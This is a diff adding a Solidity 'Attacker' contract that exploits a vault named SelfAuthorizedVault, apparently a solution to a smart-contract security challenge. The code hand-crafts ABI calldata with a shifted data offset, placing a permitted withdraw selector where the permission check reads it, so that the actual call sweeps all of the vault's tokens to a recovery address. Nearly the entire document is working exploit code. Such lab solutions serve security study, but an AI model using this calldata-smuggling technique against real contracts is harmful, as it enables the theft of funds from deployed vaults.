@@ -58,3 +58,41 @@ contract SelfAuthorizedVault is AuthorizedExecutor {
         }
     }
 }
+
+contract Attacker {
+    SelfAuthorizedVault public vault;
+    IERC20 public token;
+    address public recovery;
+
+    constructor(SelfAuthorizedVault _vault, address _token, address _recovery) {
+        vault = _vault;
+        token = IERC20(_token);
+        recovery = _recovery;
+    }
+
+    function attack() external returns (bytes memory) {
+        bytes4 executeSelector = vault.execute.selector;
+        bytes memory target = abi.encodePacked(bytes12(0), address(vault));
+        // AuthorizedExecutor.execute checks 0x04 function selector, we will keep it in 0x80
+        bytes memory dataOffset = abi.encodePacked(uint256(0x80));
+        bytes memory empty = abi.encodePacked(uint256(0));
+        // Withdraw function selector will be at the 100th byte of calldata (4 + 32*3), so we can pass the permissions check in the execute function
+        bytes memory withdrawSelectorPadded = abi.encodePacked(bytes4(0xd9caed12), bytes28(0));
+        bytes memory sweepFundsCalldata = abi.encodeWithSelector(vault.sweepFunds.selector, recovery, token);
+
+        uint256 actionDataLengthValue = sweepFundsCalldata.length;
+        bytes memory actionDataLength = abi.encodePacked(uint256(actionDataLengthValue));
+
+        // Construct the calldata payload for the `execute()` function, use this payload and directly perform low-level call to the vault contract
+        bytes memory calldataPayload = abi.encodePacked(
+            executeSelector, // 4 bytes
+            target, // 32 bytes
+            dataOffset, // 32 bytes
+            empty, // 32 bytes
+            withdrawSelectorPadded, // 32 bytes (starts at the 100th byte)
+            actionDataLength, // Length of actionData
+            sweepFundsCalldata // The actual calldata to `sweepFunds()`
+        );
+        return calldataPayload;
+    }
+}
